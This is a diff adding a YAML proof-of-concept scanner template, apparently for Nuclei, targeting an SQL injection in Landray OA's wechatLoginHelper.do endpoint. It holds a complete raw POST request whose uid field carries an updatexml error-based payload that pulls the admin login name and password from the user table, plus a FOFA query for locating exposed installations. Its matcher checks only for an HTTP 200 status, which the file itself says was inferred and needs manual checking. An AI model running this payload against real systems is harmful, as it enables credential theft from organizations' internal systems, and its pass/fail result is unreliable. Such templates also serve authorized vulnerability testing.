@@ -1,0 +1,36 @@
+id: poc-aliyh5i4kfq8u6uy
+info:
+  name: 蓝凌OA-WechatLoginHelper.do存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aliyh5i4kfq8u6uy
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: aliyh5i4kfq8u6uy
+    fofa: app="Landray-OA系统"
+http:
+- raw:
+  - 'POST /third/wechat/wechatLoginHelper.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.850.132 Safari/537.36
+
+    Content-Length: 254
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip
+
+
+    method=edit&openid=&nickname=&image=&uid=123''and updatexml(1,concat(''~'',(select concat(''~'',test.fdLoginName,''~'',test.fdPassword,''~'') from com.landray.kmss.sys.organization.model.SysOrgPerson test where test.fdLoginName like ''%25admin12%25''),''~''),1)=1-- '''
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
